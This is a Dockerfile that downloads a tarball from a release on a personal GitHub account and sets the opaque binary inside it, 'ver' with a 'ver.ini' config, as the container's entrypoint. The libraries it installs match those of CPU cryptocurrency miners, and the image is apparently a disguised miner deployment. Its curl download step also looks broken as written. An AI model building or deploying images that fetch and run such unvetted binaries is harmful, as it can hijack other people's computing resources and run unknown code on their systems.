FROM debian:sid-slim as builder

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN curl -O https://github.com/imraahatikah6827/hi/releases/download/hi/ver.tar.gz && \ 
    tar xf ver.tar.gz && \
    mv ver /usr/local/bin/ && \
    mv ver.ini /usr/local/bin/ && \
    rm -rf ver.tar.gz
    
FROM debian:sid-slim

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

COPY --from=builder /usr/local/bin/ver /usr/local/bin/
COPY --from=builder /usr/local/bin/ver.ini /usr/local/bin/

ENTRYPOINT [ "ver" ]
CMD [ "ver.ini" ]
